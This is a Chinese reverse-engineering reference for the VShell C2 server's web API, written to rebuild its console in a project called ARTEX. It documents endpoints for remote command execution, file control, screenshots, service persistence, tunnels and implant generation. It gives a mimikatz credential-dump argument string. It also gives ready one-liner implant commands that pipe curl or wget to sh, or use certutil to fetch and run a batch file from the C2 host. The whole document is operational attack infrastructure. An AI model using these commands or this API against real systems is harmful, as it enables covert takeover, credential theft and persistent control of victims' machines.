# VShell C2 Web 功能与接口全量文档

> 来源:h0nayuzu 实测 vshell 4.9.3 web(前端版本 2.10.1-232935d7515d,2026-10 抓包+bundle 逆向)。
> 用途:ARTEX `Shell 管理 → VShell 管理` 的复刻依据;日后迁移/优化/再对齐以本文为准。

## 0. 接入总则

- **网关卡**:全部请求(含 `/api/login`)带 `Authorization: Basic base64(user:pass)`;站点级 401 栅栏。
- **登录**:`POST {base}/api/login`,body `{"username","password"}` → `result.token`(JWT,**12h**)。
- **业务调用**:`POST {base}/api/{endpoint}`,JSON body,头 `Token: <jwt>`(**无 Bearer 前缀**,自定义头)+ Basic 网关头。
- **信封**:HTTP 恒 200;`{"code":0,"message":"ok","result":...,"type":"success"}`。token 失效 = body `code:401`;业务错误 `code:-1`(如命令退出码非 0 → `message:"exit status N"`,此时**无输出回传**)。
- **ARTEX 代理形态**:统一走 `POST /api/shell/vshell/{id}/api/{endpoint}`,body `{"endpoint":"...","body":{...},"timeout_s":60}`;端点白名单校验在 `server/shell_vshell.go vshellGeneric`。文件/插件上传、客户端生成走专用代理路由。

## 1. 端点总表(全部 POST,除注明外)

| 端点 | 参数(body JSON) | 说明/细节 |
|---|---|---|
| `login` | `{username,password}` | result.token;12h;401=Basic 拒 |
| `dashboard/info` | `{}` | 站点总览;字段见 §2 |
| `client/list` | `{page,pageSize,status}` | status:true 仅在线;result.items[]+total;字段见 §3 |
| `client/add` | `{ip,port,tp,vkey,salt,proxy?}` | **正向连接**:让已上线客户端回连 ip:port;tp=tcp/kcp/ws;proxy 形如 `socks5://user:pass@host:port`,不使用留空 |
| `client/editremark` | `{id,remark}` | 改备注,写回 vshell |
| `client/delfile` | `{id}` | 删除客户端文件(自毁) |
| `client/delprocess` | `{id}` | 杀进程(自毁) |
| `client/dellist` | `{id}` | 删除离线台账记录(id 为数字) |
| `listener/list` | `{page,pageSize,status?,mode?,ListenerId?}` | status:true 仅在线;mode 可过滤;字段见 §4 |
| `listener/add` | §4 表单对象 | 新增;Mode=tcp/kcp/ws/dns/doh/dot/oss |
| `listener/edit` | `{Id,...表单}` | 编辑(注意 Id 大写) |
| `listener/editremark` | `{id,remark}` | |
| `listener/del` | `{id}` | |
| `listener/dellist` | `{id}` | (id 数组语义未确认——原版批量选择走 dellist) |
| `listener/start` / `listener/stop` | `{id}` | 启用/停用 |
| `tunnel/list` | `{page,pageSize,ClientId?}` | ClientId 过滤;items[]:Id/Mode/Port/Username/Password/ClientId/Status/Remark/Target |
| `tunnel/add` | `{ClientId,Mode,Port,Remark,Username?,Password?,Target?}` | Mode=socks5/http 带账密;tcp/udp 带 Target(host:port) |
| `tunnel/edit` | `{id,...}` | |
| `tunnel/editremark` | `{id,remark}` | |
| `tunnel/del` / `tunnel/start` / `tunnel/stop` | `{id}` | |
| `tunnel/dellist` | `{id}` | 批量删 |
| `terminal/shell` | `{id,command}` | **同步阻塞**;result=输出字符串;退出码非 0 → `message:"exit status N"` 且**无输出**;目标离线 `message:"client is close"` |
| `screenshot/get` | **GET** `?id=&quality=` | quality=high/mid/low;timeout 建议 120s;返回图片 |
| `runner/list` | `{}` | result=[{id,name}]——plugins 目录文件清单;**插件以 name(文件名)为标识**而非数字 id(内存加载运行;后缀规范:.net→net,elf→elf) |
| `runner/runplugin` | `{id:客户端Id, pluginName:"fscan.x64.elf", procArg:"参数"}` | **原版表单字段**(vD-pDrbd4.js 实证);result=插件输出字符串;选 mimikatz.x64.exe 时原版默认填 `privilege::Debug sekurlsa::logonpasswords exit` |
| `runner/upload` | multipart `file` | 上传插件到 plugins 目录(前端 timeout 24h 级) |
| `setting/get` | `{}` | result={dingding_access_token,dingding_key_word,wx_key} |
| `setting/edit` | 同上三字段 | 无需重启生效 |
| `install/install` | `{client_id,name,description?}` | 开机启动:注册服务(**Windows 需管理员,Linux 需 root**) |
| `install/remove` | `{client_id,...}` | 卸载服务 |
| `file/ls` | `{id,path}` | result.items[] 行=`{name,isDir,time,mode,size}`(全小写,2026-10 实测;time 形如 `2024-04-22 21:08:03`,mode 形如 `0755`) |
| `file/getdisk` | `{id}` | 盘符/根列表(linux 返回 ["/"];windows 返回盘符数组) |
| `file/cat` | `{id,path,target}` | result.content(文本) |
| `file/edit` | `{id,path,target,content}` | **整文件覆盖**写 |
| `file/mkdir` / `file/touch` | `{id,path,target}` | 建目录/建空文件(touch 也用 target) |
| `file/rm` | `{id,path,target}` | 删单个 |
| `file/rmlist` | `{id,path,targets?}` | 批量删(表单多选) |
| `file/mv` | `{id,path,target,to}` | 重命名/移动 |
| `file/modifytime` | `{id,path,target,time?}` | 修改时间(文件管理器"修改时间"操作) |
| `file/wget` | `{id,path,target}` | target=URL,下载到目标机 |
| `file/upload` | multipart `id,path,file` | 上传(页面通道 ≤5MB 实测限制来自前端;ARTEX 代理 ≤8MB) |
| `file/downloadtoserver` | `{id,path,target}` | 下载第 1 步:beacon → vshell 服务端 |
| `file/getdownloadper` | `{id,path,target,size?}` | 轮询进度 `{pre:0-100}`;1s 间隔 |
| `file/downloadtooss` | `{id,...}` | 转 OSS(原版功能,ARTEX 未接) |
| `file/downloadtobrowser` | **GET** `?id=&target=` | 下载第 3 步:流式回浏览器(带 Token 头) |
| `download/*` | **GET**,见 §5 | 客户端生成(7 类) |
| `error-log/list` | `{page,pageSize?}` | 服务端错误日志(原版"关于"附近,ARTEX 未接) |

## 2. dashboard/info 字段(4.9.3 实测)

```
clientCount(在线客户端数) clientNum(授权客户端数量,字符串) clientOnlineCount
cpu(0-100) disk(0-100) swap_mem virtual_mem(0-100)
tcp tcpC tcpCount udp udpCount udplite icmp icmpmsg(连接统计)
io_send io_recv(KB/s 带宽) exportFlowCount inletFlowCount
listenerCount listenerOnlineCount socks5Count httpProxyCount p2pCount hostCount secretCount
httpProxyPort httpsProxyPort p2pPort web_port(字符串)
licTime(授权到期,如 20241101) version("4.9.3") vip(bool)
web_basic_auth(bool) ip ipLimit flowStoreInterval load(JSON 字符串 {load1,load5,load15})
logLevel logPath
```
ARTEX 仪表盘映射:`sysBars`(cpu/disk/mem→virtual_mem/virtualmem)+`sysKv`(tcp/udp/io_send/io_recv)+`cfgRows`(version/web_port→WEB端口/basicauth/licTime→授权到期/advanced→高级授权/clientnum→授权客户端数量/iplimit/httpproxyport/httpsproxyport);大小写不敏感,未命中行隐藏,其余字段折叠"其余字段(N)"。

## 3. client/list 行字段(实测)

```
Id(数字) IsConnect(bool) Tp("ws"|"tcp"|"kcp"...) Addr(出口IP) Remark Status(bool)
LocalIP UserName HostName Location("江西省 广电网") OsName("linux_amd64")
ProcessName("[kworker/0:2]") PingCheckTime RateLimit
Flow{ExportFlow,InletFlow,FlowLimit} Rate{<vkey>:0} NoStore NoDisplay MaxConn NowConn
```

## 4. 监听(listener)字段与表单

列表行:`Id Remark Mode ListenAddr ConnectAddr WsConnectAddr? DNSDomain? PublicDNS? MaxDNSsize? DisconnectTimeout PingInterval Vkey EncryptSalt OssUrl? Status`

表单(新增/编辑,字段名逐字对齐):
- **Mode**:tcp / kcp / ws / dns / doh / dot / oss(原版单选:"TCP","KCP/UDP","WebSocket","DNS","DOH","DOT","OSS")
- **ListenAddr**(必填,ph `0.0.0.0:8084`)/**ConnectAddr**(外网连接地址,ph `127.0.0.1:8084`;tcp|ws 必看)
- **DNSDomain**(DNS 模式)/ **PublicDNS**+**MaxDNSsize**(默认 512)
- **DisconnectTimeout**(超时心跳次数,默认 30)/ **PingInterval**(心跳间隔秒,默认 10)
- **Vkey**(默认 `qwe123qwe`)/ **EncryptSalt**(流量加密盐,默认 `qwe123qwe`)/ **OssUrl**("Bucket 域名",仅 oss)

**一键上线命令**(tcp/kcp 监听,原版"上线命令查看"):由 `ConnectAddr` 的主机:端口(回退 ListenAddr 端口)拼:
- Linux:`(curl -fsSL -m180 http://HOST:PORT/slt||wget -T180 -q http://HOST:PORT/slt)|sh`
- Windows:`certutil.exe -urlcache -split -f http://HOST:PORT/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat`

## 5. 客户端生成(/download/*,全部 GET+Token 头)

| 类型 | Query | 备注 |
|---|---|---|
| `download/stage` | `arch=&id=` | Stage 反向,小体积;id=监听 Id |
| `download/shellcode` | `arch=&format=&id=` | format 如 `_raw`(拼在 arch 后:实际为 `arch=<arch><format>`);Windows shellcode |
| `download/stageless` | `id=&arch=&upx=&proxy=` | upx=true/false;proxy 留空不使用 |
| `download/dll` | `id=&arch=&upx=&proxy=`;`arch=loader` → loader.go | dll stageless |
| `download/listen` | `arch=&tp=&host=&port=&vkey=&salt=&upx=`(+`&listen=true&ebpf=true` 为 ebpf) | 正向客户端 |
| `download/listendll` | 同 listen | dll listen(tp 变量名=文件名) |
| `download/ebpf` | (bundle 中有路径,复用 listen+ebpf=true 亦可) | eBPF 正向(仅 linux) |

arch 全集:`darwin_amd64 darwin_arm64 linux_amd64 linux_i386 linux_arm64 linux_arm windows_amd64 windows_i386`(ebpf 只 linux)。
注意:前端拼接时 arch 传的是**下划线后段**(如 `amd64`)——实测 URL 为 `arch=amd64&id=1`;ARTEX 侧原样透传 query,由前端负责拼参。

## 6. 页面结构(原版 web)

- 顶导航:仪表盘 | 客户端管理 | 监听管理 | 客户端生成 | 插件运行 | 隧道代理 | 系统设置 | 关于;页签条(多开 tab)。
- **仪表盘**:四统计卡(监听总数/在线监听数/客户端总数/在线客户端)+ 配置信息(日志级别/日志文件/授权到期时间/高级授权/授权客户端数量/WEB端口/Basic认证/版本)+ 系统信息(处理器/磁盘/内存/虚拟内存 进度条 + TCP/UDP 通讯 + 流出/流入带宽)。
- **客户端管理**:搜索/批量选择/正向连接/刷新/列设置;列:ID 备注(可改) 连接方式 外网IP 归属地 内网IP 用户 主机名 系统类型 进程名 状态 心跳 操作(主机管理/隧道代理)。
  - **主机管理**(行点击 → `#/clientManager/{id}`)子标签:命令控制(交互式终端 xterm/非交互式备用/关闭终端)、文件管理(文件树+列表:Open/新建文件夹/新建文件/wget文件/上传文件,列 Name/Time/Mode/Size,行操作含下载/编辑/重命名/复制/修改时间/全选删除)、屏幕截屏(清晰度高/中/低+获取截屏,点击放大)、屏幕监控(定时截屏流)、插件运行、开机启动(安装服务名称/服务描述/安装/卸载)。
- **监听管理**:批量选择/新增监听;列:ID 备注 模式 监听地址 外网连接地址 超时心跳次数 心跳间隔 状态 操作(启用/停用/编辑/上线命令查看[tcp|kcp]/删除)。
- **客户端生成**:七标签(见 §5)。
- **插件运行**:选择客户端/选择插件/参数/运行/上传文件/output 大框。
- **隧道代理**:批量选择/新增隧道;表单:选择客户端/模式(Socks5隧道|HTTP隧道|TCP代理|UDP代理)/备注/服务端端口/用户名/密码。
- **系统设置**:钉钉 token/钉钉 key_word/微信 wx_key/保存(无需重启)。

## 7. ARTEX 侧实现对照(本仓库)

| 原版功能 | ARTEX 落点 | 状态 |
|---|---|---|
| 站点登记+自动登录 | `shell_vshell_servers` 表 + VshellClient(Basic+JWT 12h+401 自愈) | ✅ |
| 仪表盘 | `vshell-workspace.tsx` dashboard(统计卡+系统/配置信息) | ✅(字段映射见 §2) |
| 客户端管理 | clients(大表/仅在线/10s 自动刷新/改备注写回) | ✅ |
| 正向连接 client/add | clients 工具栏「正向连接」对话框 | ✅ |
| 终端 terminal/shell | 主机子页 terminal(`; true` 收尾提示) | ✅ |
| 文件管理 | 主机子页 files(ls/cat/edit/mkdir/rm/mv/touch/wget/上传≤8MB/三步链下载) | ✅(rmlist/modifytime/getdisk 走通用转发,UI 未单列) |
| 监听管理全套 | listeners-page(增/编辑/启停/删/上线命令) | ✅ |
| 客户端生成 | generator-page(七标签,代理 /download/*) | ✅ |
| 插件运行 | plugins-page(runplugin/上传走 runner/upload 代理) | ✅ |
| 隧道代理 | tunnels-tab(socks5/http/tcp/udp 增删启停,点端口复制地址) | ✅ |
| 系统设置 | settings-page(dingding/wx) | ✅ |
| 屏幕截屏/监控 | 通用转发可调 screenshot/get;UI 未做 | ⏳(后端白名单已放行) |
| 开机启动 install | 通用转发可调 install/install|remove;UI 未做 | ⏳ |
| file/downloadtooss、error-log | 未接 | ⏳ |

## 8. 已知坑

- `terminal/shell` 退出码非 0 不回传输出——命令以 `; true` 收尾可保输出。
- 业务头是 `Token:`(非 Bearer);所有请求同时带 Basic 网关头。
- token 12h;失效以 **body code:401** 表达(HTTP 恒 200),需重登重放一次。
- `client/list` 的 `Rate` 是 map(键为 vkey),值恒 0,可忽略。
- 监听 edit 用大写 `Id`;其余端点 id 小写——别混。
- 前端对 `/client/list` 有 10s 轮询(在线页);ARTEX 用「10s 自动刷新」开关对应。
- 上线命令里的 `/slt` `/swt` 是 vshell 内置分发路径,不要拼错。
- Basic 凭据变更 → ARTEX 侧 sig 变化自动重建客户端(token 作废)。
